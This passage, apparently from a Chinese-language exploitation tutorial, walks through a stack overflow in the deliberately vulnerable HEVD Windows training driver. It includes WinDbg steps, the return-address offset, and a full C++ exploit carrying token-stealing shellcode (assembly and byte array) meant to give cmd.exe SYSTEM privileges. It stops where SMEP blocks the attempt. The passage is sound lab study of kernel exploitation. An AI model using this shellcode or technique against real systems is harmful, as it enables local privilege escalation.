[0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;input io ctl&gt; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">    hDevice = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\My1DeviceLinker&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Error Create File\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> io_ctl = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="built_in">scanf_s</span>(<span class="string">&quot;%x&quot;</span>, &amp;io_ctl);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x, %x&quot;</span>, io_ctl, <span class="built_in">io2num</span>(io_ctl));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (io_ctl)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Now Excuting ...\n&quot;</span>;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;1. [0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ****** ...\n&quot;</span>;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// EXP FUNCTION HERE</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="c-简单与功能交互"><a class="markdownIt-Anchor" href="#c-简单与功能交互"></a> C. 简单与功能交互</h2><p><img src="https://img.joe1sn.top/uploads/big/7a3682b00304fa6f8b1ed11bcbb9d718.png" alt="image-20240117192837142" /></p><p>这里要传一个空间和大小过去，这里用的到方式就是上一篇的IOCTL方式</p><p>这里我把所有的exp定义在<code>exp.c</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x50</span>] = <span class="string">&quot;aaaaa\0&quot;</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x30</span>;</span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl, stackspace, <span class="built_in">sizeof</span>(DWORDLONG), &amp;size, <span class="built_in">sizeof</span>(DWORDLONG), &amp;info, <span class="literal">NULL</span>);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/a6c2dc60148f0770a7225e57d80fe2c7.png" alt="image-20240117195630472" /></p><p>驱动定义了一个2048大小的栈空间<code>v5</code>，但是写入的空间是我们可以控制的，尝试触发漏洞</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x1000</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, size, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl, </span><br><span class="line">stackspace, size, </span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>, </span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/7874f17a8d4d02206828dc53d3cab9ac.png" alt="image-20240117202959678" /></p><p><img src="https://img.joe1sn.top/uploads/big/b65a46ebcb5df65ffc94318470bfc834.png" alt="image-20240117211228964" /></p><h2 id="d-开始调试"><a class="markdownIt-Anchor" href="#d-开始调试"></a> D. 开始调试</h2><p>之前符号表好像没加载上，在windbg中，HEVD的描述符一般在同级文件夹下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.sympath+ &lt;pdb文件物理机上的路径&gt;</span><br></pre></td></tr></table></figure><p>然后再</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lm m HEVD</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ec3aa1ca49a1c562e3f258276569051c.png" alt="image-20240117224344703" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x /D /f HEVD!*</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/e1effb52c7e61dbd37dec5d4ae999c44.png" alt="image-20240117224429242" /></p><p>下个断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp HEVD!TriggerBufferOverflowStack</span><br></pre></td></tr></table></figure><p>这里运行下不崩溃的</p><p><img src="https://img.joe1sn.top/uploads/big/f006a81272655c32bcadac39d047e344.png" alt="image-20240117224828729" /></p><h3 id="i-windbg-调试常用"><a class="markdownIt-Anchor" href="#i-windbg-调试常用"></a> I. Windbg 调试常用</h3><p>在使用Windbg调试内核驱动程序时，你可以使用以下命令查看内存地址：</p><ul><li><p>64位查看内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dq &lt;内存地址&gt; L &lt;要查看的长度，长度是64位为一组&gt;</span><br></pre></td></tr></table></figure></li><li><p>64位查看内存，单列显示，这在查看栈的情况是比较好用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dqs &lt;内存地址&gt; L &lt;要查看的长度，长度是64位为一组&gt;</span><br></pre></td></tr></table></figure></li><li><p>在某处添加断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp &lt;内存虚拟地址&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bp &lt;模块名&gt;!&lt;函数名&gt;</span><br><span class="line">//bp: break point 如 bp HEVD!TriggerBufferOverflowStack</span><br></pre></td></tr></table></figure></li><li><p>查看所有断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bl</span><br></pre></td></tr></table></figure></li><li><p>快速反汇编，适合查看gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u &lt;内存地址&gt;</span><br></pre></td></tr></table></figure></li><li><p>反汇编该地址对应的一段汇编，适合反汇编这段函数后选择断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uf &lt;内存地址&gt;</span><br><span class="line">uf &lt;模块名&gt;!&lt;函数名&gt;</span><br></pre></td></tr></table></figure></li><li><p>计算器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? &lt;计算表达式&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="ii-内存布局"><a class="markdownIt-Anchor" href="#ii-内存布局"></a> II. 内存布局</h3><p><img src="https://img.joe1sn.top/uploads/big/da9b01520c9211cd93d3d115e7038832.png" alt="image-20240117225628917" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x80</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, size, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl, </span><br><span class="line">stackspace, size, </span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>, </span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果引发溢出的话，看看kernel中的<code>v5</code>变量的布局</p><p><img src="https://img.joe1sn.top/uploads/big/533fe5848e91b5a10810b49521a1b4c0.png" alt="image-20240117231239916" /></p><p><img src="https://img.joe1sn.top/uploads/big/3f6b619a89d60563919834ae5442e701.png" alt="image-20240117231345354" /></p><p>这里的kernelBuffer就相当于用户模式下的“栈帧”</p><p>同时可以看到我们程序的内存</p><p><img src="https://img.joe1sn.top/uploads/big/fcfe15fb3b2fec30ee5ef6c8baf8a314.png" alt="image-20240117235653641" /></p><p><img src="https://img.joe1sn.top/uploads/big/28848667498b38b1a820bac1838ba971.png" alt="image-20240117235638456" /></p><p>这个时候顺便看一下rbp</p><p><img src="https://img.joe1sn.top/uploads/big/dcdee888e276aed122855f092a922429.png" alt="image-20240117231511587" /></p><p>在<code>pop</code>前下断点再运行到</p><p><img src="https://img.joe1sn.top/uploads/big/1a869ecdf8003008e6c2a871f2a17c02.png" alt="image-20240117234330859" /></p><p>所以是rsp+0x20+0x818就得到ret的地址</p><p>很明显这里可以通过栈溢出劫持返回地址，然后实现我们的shellcode</p><h3 id="iii-布置构思"><a class="markdownIt-Anchor" href="#iii-布置构思"></a> III. 布置构思</h3><ul><li>首先 <strong>驱动是64位</strong>，所以要用64位的思维去布局</li><li>其次，驱动和我们的程序内存之间是能访问的，所以我们在Ring3写shellcode，然后覆盖到Ring0去执行</li></ul><p>那么就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;a&quot;</span>*<span class="number">0x810</span>+p64(shellcode_addr)</span><br></pre></td></tr></table></figure><h1 id="shellcodeexp编写"><a class="markdownIt-Anchor" href="#shellcodeexp编写"></a> Shellcode+exp编写</h1><h2 id="a-shellcode"><a class="markdownIt-Anchor" href="#a-shellcode"></a> A. shellcode</h2><p>主要是用这篇：<a href="https://blog.xpnsec.com/hevd-stack-overflow/">Exploiting Windows 10 Kernel Drivers - Stack Overflow</a> 或者里面参考的两篇</p><p>主要目的就是拿去Token然后替换掉一个cmd.exe的Token实现提权，<strong>在下一篇文章中会详细提到</strong></p><blockquote><p>This time around we will pass the PID into the shellcode, which means that our tweaked shellcode will look like this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">[BITS 64]</span><br><span class="line"></span><br><span class="line">push rax</span><br><span class="line">push rbx</span><br><span class="line">push rcx</span><br><span class="line">push rsi</span><br><span class="line">push rdi</span><br><span class="line"></span><br><span class="line">mov rax, [gs:0x180 + 0x8]   ; Get &#x27;CurrentThread&#x27; from KPRCB</span><br><span class="line"></span><br><span class="line">mov rax, [rax + 0x220]       ; Get &#x27;Process&#x27; property from current thread</span><br><span class="line"></span><br><span class="line">next_process:</span><br><span class="line">cmp dword [rax + 0x2e0], 0x41414141  ; Search for &#x27;cmd.exe&#x27; process (&#x27;AAAA&#x27; replaced by exploit)</span><br><span class="line">je found_cmd_process</span><br><span class="line">mov rax, [rax + 0x2e8]            ; If not found, go to next process</span><br><span class="line">sub rax, 0x2e8</span><br><span class="line">jmp next_process</span><br><span class="line"></span><br><span class="line">found_cmd_process:</span><br><span class="line">mov rbx, rax                     ; Save our cmd.exe EPROCESS for later</span><br><span class="line"></span><br><span class="line">find_system_process:</span><br><span class="line">cmp dword [rax + 0x2e0], 0x00000004  ; Search for PID 4 (System process)</span><br><span class="line">je found_system_process</span><br><span class="line">mov rax, [rax + 0x2e8]</span><br><span class="line">sub rax, 0x2e8</span><br><span class="line">jmp find_system_process</span><br><span class="line"></span><br><span class="line">found_system_process:</span><br><span class="line">mov rcx, [rax + 0x358]            ; Take TOKEN from System process</span><br><span class="line">mov [rbx+0x358], rcx              ; And copy it to the cmd.exe process</span><br><span class="line"></span><br><span class="line">pop rdi</span><br><span class="line">pop rsi</span><br><span class="line">pop rcx</span><br><span class="line">pop rbx</span><br><span class="line">pop rax</span><br><span class="line"></span><br><span class="line">; return goes here</span><br></pre></td></tr></table></figure></blockquote><h2 id="b-exp"><a class="markdownIt-Anchor" href="#b-exp"></a> B. EXP</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> shellcode[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x50</span>, <span class="number">0x53</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x20</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x81</span>, <span class="number">0xb8</span>, <span class="number">0xe0</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x41</span>, <span class="number">0x41</span>,</span><br><span class="line"><span class="number">0x41</span>, <span class="number">0x74</span>, <span class="number">0x0f</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xe8</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x2d</span>, <span class="number">0xe8</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xeb</span>, <span class="number">0xe5</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,</span><br><span class="line"><span class="number">0xc3</span>, <span class="number">0x83</span>, <span class="number">0xb8</span>, <span class="number">0xe0</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x74</span>, <span class="number">0x0f</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xe8</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x2d</span>, <span class="number">0xe8</span>,</span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xeb</span>, <span class="number">0xe8</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x88</span>, <span class="number">0x58</span>, <span class="number">0x03</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x5f</span>,</span><br><span class="line"><span class="number">0x5e</span>, <span class="number">0x59</span>, <span class="number">0x5b</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc4</span>, <span class="number">0x28</span>, <span class="number">0xc3</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DWORD oldProtect;</span><br><span class="line">STARTUPINFOA si;</span><br><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x820</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x810</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode;</span><br><span class="line"></span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(shellcode, <span class="number">256</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Spawning a new cmd.exe process\n&quot;</span>);</span><br><span class="line">si.cb = <span class="built_in">sizeof</span>(STARTUPINFOA);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;cmd.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">true</span>, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] FATAL: Error spawning cmd.exe\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Updating our shellcode to search for PID %d\n&quot;</span>, pi.dwProcessId);</span><br><span class="line">*(DWORD*)((<span class="type">char</span>*)shellcode + <span class="number">27</span>) = pi.dwProcessId;</span><br><span class="line"></span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl,</span><br><span class="line">stackspace, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/b79e4ef722ad8e26cab88c67a5224aa1.png" alt="image-20240118002020265" /></p><p>然后到ret返回，查看返回地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/4c65cdde199c60120b262e70f5635485.png" alt="image-20240118002154225" /></p><p>发现返回地地址已经被覆盖了，继续走下去</p><p><img src="https://img.joe1sn.top/uploads/big/4d009e4de60cbc5e00a14daaee7b7ab1.png" alt="image-20240118002325326" /></p><p>跳转到了shellcode了，再走两步</p><p><img src="https://img.joe1sn.top/uploads/big/777b9bff2c6634898c68adf02ca19a72.png" alt="image-20240118002504625" /></p><p>？？？</p><p><img src="https://img.joe1sn.top/uploads/big/1ab88b491fdcf9a1627f14b8a708a8ed.png" alt="image-20240118002613223" /></p><p><img src="https://img.joe1sn.top/uploads/big/b1b94aa13dbf421338b2bf2ac25a1827.png" alt="image-20240118003040168" /></p><p>说我在执行不可执行的内存，但是明明已经<code>VirtualProtect(shellcode, 256, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</code></p><p>？？？越来越离谱了</p><p>尝试把shellcode移动到常量内存中试试，还是不行，接着我再进行ioctl之前pause一下，好像可以了</p><p><img src="https://img.joe1sn.top/uploads/big/a1b311e4b3eef101d2e0a98327149622.png" alt="image-20240118013041535" /></p><p>但是依然被说执行不可执行代码</p><h1 id="新的保护机制"><a class="markdownIt-Anchor" href="#新的保护机制"></a> 新的保护机制</h1><p>查了<a href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/#">其他的解法</a>，发现Windows 8过后微软添加了一个叫做SMEP保护的东西</p><p>你可以在这里查到关于Windows的所有保护机制：<a href="https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10">https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10</a></p><blockquote><ul><li><strong>监督器模式执行防护 (SMEP)</strong> ：帮助防止内核 (“监督器”) 在用户页面中执行代码，这是攻击者用于本地内核提升特权 (EOP) 的常见技术。 此配置需要在 Intel Ivy Bridge 或更高版本处理器中找到处理器支持，或者具有 PXN 